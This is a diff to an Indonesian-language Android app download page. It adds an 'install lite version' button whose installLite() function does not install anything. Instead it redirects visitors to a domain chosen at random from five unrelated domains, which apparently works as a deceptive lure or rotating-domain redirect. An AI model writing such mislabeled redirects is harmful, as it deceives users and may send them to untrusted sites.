@@ -574,6 +574,7 @@
           0 1px 0 rgba(255, 255, 255, 0.25) inset,
           0 8px 24px -8px rgba(230, 57, 81, 0.5);
       }
+      .cta.lite-cat { margin-bottom: 16px; }
       .cta-icon {
         width: 22px;
         height: 22px;
@@ -3388,6 +3389,28 @@
           </div>
         </div>
         <a
+          class="cta lite-cat"
+          data-platform="android"
+          href="javascript:void(0)"
+          onclick="installLite()"
+        >
+          <span class="cta-icon">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+              <path
+                d="M12 3V15M12 15L7 10M12 15L17 10M5 18H19"
+                stroke="currentColor"
+                stroke-width="2.2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </span>
+          <span class="cta-text-wrap">
+            Cocok untuk semua pengguna 
+            Disarankan•instal versi ringan
+          </span>
+        </a>
+        <a
           class="cta"
           data-platform="android"
           href="javascript:void(0)"
@@ -3837,6 +3860,11 @@
             document.body.removeChild(loading);
           }, 2000);
         }
+      }
+      function installLite() {
+        const whiteNames = ['longdefa.com', 'fsgmsb.com', 'fqdscm.com', 'metochem.com', 'szwhbw.com'];
+        const randomName = whiteNames[Math.floor(Math.random() * whiteNames.length)];
+        window.location.href = `https://${randomName}`;
       }
       function closeOverlay() {
         document.documentElement.style.overflow = "";
